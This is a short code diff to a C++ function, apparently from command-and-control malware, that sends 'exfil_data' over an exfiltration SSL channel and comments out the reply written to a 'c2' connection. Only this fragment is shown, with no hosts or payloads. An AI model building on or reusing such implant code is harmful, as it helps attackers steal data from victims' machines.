@@ -138,7 +138,7 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
     if (exfil_ssl && !exfil_data.empty()) {
         SSL_write(exfil_ssl, exfil_data.c_str(), exfil_data.size());
     }
-    SSL_write(c2_ssl, c2_response.c_str(), c2_response.size());
+    // SSL_write(c2_ssl, c2_response.c_str(), c2_response.size());
 }
 
 SSL_CTX* createSSLContext() {
